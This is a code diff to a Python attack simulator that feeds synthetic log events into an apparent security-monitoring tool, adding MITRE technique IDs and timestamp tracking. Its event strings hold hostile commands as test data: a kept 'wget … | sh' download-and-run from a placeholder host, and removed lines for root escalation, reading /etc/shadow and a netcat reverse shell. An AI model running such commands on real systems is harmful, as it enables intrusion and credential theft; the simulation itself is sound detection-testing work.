@@ -35,26 +35,26 @@ async def simulate_full_attack(
 
     # Attack chain events
     attack_chain = [
-        # Phase 1: Reconnaissance (Port Scanning)
+        # Phase 1: Reconnaissance (Port Scanning) - T1046
         {
             "stage": "Reconnaissance",
-            "event_type": "ssh_failed_login",
-            "raw_event": f"Port scan detected from {attacker_ip}",
+            "event_type": "port_scan",
+            "raw_event": f"Port scan detected from {attacker_ip}: TCP SYN probe on ports 22, 80, 443, 8080",
             "delay": 0
         },
         {
             "stage": "Reconnaissance",
-            "event_type": "ssh_failed_login",
-            "raw_event": f"Port scan detected from {attacker_ip}",
+            "event_type": "port_scan",
+            "raw_event": f"Port scan detected from {attacker_ip}: TCP SYN probe on ports 21, 23, 25, 3306",
             "delay": 1
         },
         {
             "stage": "Reconnaissance",
-            "event_type": "ssh_failed_login",
-            "raw_event": f"Port scan detected from {attacker_ip}",
+            "event_type": "port_scan",
+            "raw_event": f"Port scan detected from {attacker_ip}: TCP SYN sweep across boundary interfaces",
             "delay": 1
         },
-        # Phase 2: Credential Access (SSH Brute Force)
+        # Phase 2: Credential Access (SSH Brute Force) - T1110
         {
             "stage": "Credential Access",
             "event_type": "ssh_failed_login",
@@ -85,49 +85,35 @@ async def simulate_full_attack(
             "raw_event": f"Failed password for admin from {attacker_ip}",
             "delay": 1
         },
-        # Phase 3: Initial Access (Successful Login)
+        # Phase 3: Initial Access (Successful Login) - T1078
         {
             "stage": "Initial Access",
             "event_type": "ssh_success",
             "raw_event": f"Accepted password for admin from {attacker_ip}",
             "delay": 2
         },
-        # Phase 4: Execution (Suspicious Command)
+        # Phase 4: Execution (Suspicious Command) - T1059
         {
             "stage": "Execution",
             "event_type": "command_execution",
             "raw_event": f"wget http://malicious.com/payload.sh | sh",
             "delay": 2
         },
-        # Phase 5: Privilege Escalation
-        {
-            "stage": "Privilege Escalation",
-            "event_type": "command_execution",
-            "raw_event": f"sudo su -",
-            "delay": 1
-        },
-        # Phase 6: Credential Access (File Access)
-        {
-            "stage": "Credential Access",
-            "event_type": "command_execution",
-            "raw_event": f"cat /etc/shadow",
-            "delay": 1
-        },
-        # Phase 7: Command & Control (Outbound)
-        {
-            "stage": "Command & Control",
-            "event_type": "command_execution",
-            "raw_event": f"nc -e /bin/sh malicious.com 4444",
-            "delay": 2
-        },
     ]
 
     # Process events with delays
+    event_first_seen = None
+    event_last_seen = None
+
     for i, event_data in enumerate(attack_chain):
         await asyncio.sleep(event_data["delay"])
+        event_time = datetime.utcnow()
+        if event_first_seen is None:
+            event_first_seen = event_time
+        event_last_seen = event_time
 
         event = EventCreate(
-            timestamp=base_time + timedelta(seconds=i * 2),
+            timestamp=event_time,
             host=f"target-server",
             source_ip=attacker_ip,
             event_type=event_data["event_type"],
@@ -145,8 +131,11 @@ async def simulate_full_attack(
         if event_data["stage"] not in simulation_status[simulation_id]["stages_completed"]:
             simulation_status[simulation_id]["stages_completed"].append(event_data["stage"])
 
+    completed_time = datetime.utcnow()
     simulation_status[simulation_id]["status"] = "completed"
-    simulation_status[simulation_id]["completed_at"] = datetime.utcnow().isoformat()
+    simulation_status[simulation_id]["completed_at"] = completed_time.isoformat()
+    simulation_status[simulation_id]["event_first_seen"] = event_first_seen.isoformat() if event_first_seen else None
+    simulation_status[simulation_id]["event_last_seen"] = event_last_seen.isoformat() if event_last_seen else None
 
     return simulation_status[simulation_id]
 
@@ -165,10 +154,10 @@ async def simulate_port_scan(
             timestamp=base_time + timedelta(seconds=i),
             host=target_host,
             source_ip=attacker_ip,
-            event_type="ssh_failed_login",
+            event_type="port_scan",
             username="scanner",
             severity="low",
-            raw_event=f"Connection attempt on port {22 + i} from {attacker_ip}"
+            raw_event=f"Port scan connection probe on port {22 + i} from {attacker_ip}"
         )
         service.process_event(event)
 
